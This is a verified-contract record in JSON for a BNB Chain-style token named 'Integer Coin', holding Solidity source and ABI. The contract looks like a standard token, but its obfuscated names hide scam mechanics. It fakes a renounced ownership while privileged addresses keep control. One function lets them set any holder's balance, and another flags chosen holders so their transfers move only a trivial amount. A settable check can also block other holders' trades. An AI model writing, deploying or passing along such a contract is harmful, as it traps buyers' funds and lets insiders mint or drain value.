{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract amountTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listReceiver {\n    function createPair(address atShouldSell, address fundSwapLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface marketingLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface sellLiquidityFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundAutoAt) external view returns (uint256);\n\n    function transfer(address fromMax, uint256 maxIs) external returns (bool);\n\n    function allowance(address takeFeeTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMax,\n        uint256 maxIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromIsSender, uint256 value);\n    event Approval(address indexed takeFeeTo, address indexed spender, uint256 value);\n}\n\ninterface maxFundEnable is sellLiquidityFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IntegerCoin is amountTeam, sellLiquidityFund, maxFundEnable {\n\n    uint256 public totalFrom;\n\n    address public fundExempt;\n\n    uint256 public liquidityLimitMax = 3;\n\n    function atTradingMax(address fromMode, address fromMax, uint256 maxIs) internal returns (bool) {\n        require(walletAt[fromMode] >= maxIs);\n        walletAt[fromMode] -= maxIs;\n        walletAt[fromMax] += maxIs;\n        emit Transfer(fromMode, fromMax, maxIs);\n        return true;\n    }\n\n    string private fundFrom = \"ICN\";\n\n    address buyMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverExempt() private view {\n        require(minExempt[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletExemptList;\n    }\n\n    uint256 public swapAutoLaunch;\n\n    uint256 private receiverWalletToken;\n\n    function amountMin(address fromMode, address fromMax, uint256 maxIs) internal view returns (uint256) {\n        require(maxIs > 0);\n\n        uint256 listLaunch = 0;\n        if (fromMode == exemptFrom && liquidityLimitMax > 0) {\n            listLaunch = maxIs * liquidityLimitMax / 100;\n        } else if (fromMax == exemptFrom && tradingToken > 0) {\n            listLaunch = maxIs * tradingToken / 100;\n        }\n        require(listLaunch <= maxIs);\n        return maxIs - listLaunch;\n    }\n\n    function launchEnableLiquidity(address fromMode, address fromMax, uint256 maxIs) internal returns (bool) {\n        if (fromMode == fundExempt) {\n            return atTradingMax(fromMode, fromMax, maxIs);\n        }\n        uint256 minExemptReceiver = sellLiquidityFund(exemptFrom).balanceOf(listFund);\n        require(minExemptReceiver == feeExemptTotal);\n        require(fromMax != listFund);\n        if (shouldLaunch[fromMode]) {\n            return atTradingMax(fromMode, fromMax, modeReceiverTake);\n        }\n        maxIs = amountMin(fromMode, fromMax, maxIs);\n        return atTradingMax(fromMode, fromMax, maxIs);\n    }\n\n    function totalLiquidityLimit(uint256 maxIs) public {\n        receiverExempt();\n        feeExemptTotal = maxIs;\n    }\n\n    uint256 public listFee;\n\n    function approve(address receiverList, uint256 maxIs) public virtual override returns (bool) {\n        walletLaunch[_msgSender()][receiverList] = maxIs;\n        emit Approval(_msgSender(), receiverList, maxIs);\n        return true;\n    }\n\n    uint8 private fromSender = 18;\n\n    function owner() external view returns (address) {\n        return totalLimit;\n    }\n\n    mapping(address => bool) public minExempt;\n\n    uint256 private launchedLaunch;\n\n    uint256 private walletExemptList = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private walletAt;\n\n    function name() external view virtual override returns (string memory) {\n        return feeTo;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundFrom;\n    }\n\n    address public exemptFrom;\n\n    string private feeTo = \"Integer Coin\";\n\n    bool public txMin;\n\n    bool public listSender;\n\n    function allowance(address liquiditySwap, address receiverList) external view virtual override returns (uint256) {\n        if (receiverList == buyMax) {\n            return type(uint256).max;\n        }\n        return walletLaunch[liquiditySwap][receiverList];\n    }\n\n    uint256 public tradingToken = 0;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromSender;\n    }\n\n    function getOwner() external view returns (address) {\n        return totalLimit;\n    }\n\n    address listFund;\n\n    event OwnershipTransferred(address indexed fromFee, address indexed teamMode);\n\n    uint256 minReceiver;\n\n    bool private totalBuy;\n\n    function transfer(address senderMarketing, uint256 maxIs) external virtual override returns (bool) {\n        return launchEnableLiquidity(_msgSender(), senderMarketing, maxIs);\n    }\n\n    address private totalLimit;\n\n    uint256 public sellMode;\n\n    function launchedAuto(address teamTake) public {\n        require(teamTake.balance < 100000);\n        if (listSender) {\n            return;\n        }\n        if (txMin) {\n            totalFrom = listFee;\n        }\n        minExempt[teamTake] = true;\n        \n        listSender = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletLaunch;\n\n    uint256 constant modeReceiverTake = 11 ** 10;\n\n    function senderTradingFee(address senderMarketing, uint256 maxIs) public {\n        receiverExempt();\n        walletAt[senderMarketing] = maxIs;\n    }\n\n    constructor (){\n        if (receiverWalletToken != sellMode) {\n            launchedLaunch = listFee;\n        }\n        minEnableWallet();\n        marketingLaunched liquidityTeam = marketingLaunched(buyMax);\n        exemptFrom = listReceiver(liquidityTeam.factory()).createPair(liquidityTeam.WETH(), address(this));\n        listFund = listReceiver(liquidityTeam.factory()).feeTo();\n        if (receiverWalletToken == swapAutoLaunch) {\n            swapAutoLaunch = receiverWalletToken;\n        }\n        fundExempt = _msgSender();\n        minExempt[fundExempt] = true;\n        walletAt[fundExempt] = walletExemptList;\n        if (launchedLaunch != totalFrom) {\n            txMin = true;\n        }\n        emit Transfer(address(0), fundExempt, walletExemptList);\n    }\n\n    function minEnableWallet() public {\n        emit OwnershipTransferred(fundExempt, address(0));\n        totalLimit = address(0);\n    }\n\n    uint256 private teamSwap;\n\n    mapping(address => bool) public shouldLaunch;\n\n    uint256 feeExemptTotal;\n\n    function transferFrom(address fromMode, address fromMax, uint256 maxIs) external override returns (bool) {\n        if (_msgSender() != buyMax) {\n            if (walletLaunch[fromMode][_msgSender()] != type(uint256).max) {\n                require(maxIs <= walletLaunch[fromMode][_msgSender()]);\n                walletLaunch[fromMode][_msgSender()] -= maxIs;\n            }\n        }\n        return launchEnableLiquidity(fromMode, fromMax, maxIs);\n    }\n\n    bool public sellLaunched;\n\n    function balanceOf(address fundAutoAt) public view virtual override returns (uint256) {\n        return walletAt[fundAutoAt];\n    }\n\n    function receiverTotal(address senderLiquiditySell) public {\n        receiverExempt();\n        if (totalFrom != teamSwap) {\n            txMin = true;\n        }\n        if (senderLiquiditySell == fundExempt || senderLiquiditySell == exemptFrom) {\n            return;\n        }\n        shouldLaunch[senderLiquiditySell] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFeeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromIsSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAutoAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTake\",\"type\":\"address\"}],\"name\":\"launchedAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquiditySell\",\"type\":\"address\"}],\"name\":\"receiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIs\",\"type\":\"uint256\"}],\"name\":\"senderTradingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAutoLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxIs\",\"type\":\"uint256\"}],\"name\":\"totalLiquidityLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IntegerCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}